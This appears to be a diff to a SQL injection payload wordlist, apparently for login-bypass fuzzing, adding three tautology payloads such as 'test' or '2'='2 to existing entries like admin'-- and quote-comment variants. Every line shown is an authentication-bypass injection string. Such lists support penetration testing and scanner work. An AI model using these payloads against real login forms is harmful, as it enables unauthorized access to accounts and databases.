@@ -10,4 +10,7 @@ admin'--
 vsauce34659'or ''='
 vsauce34659' or '3'='3
 vsauce34659'--
+test' or '2'='2
+user' or '3'='3
+example' or '4'='4
 
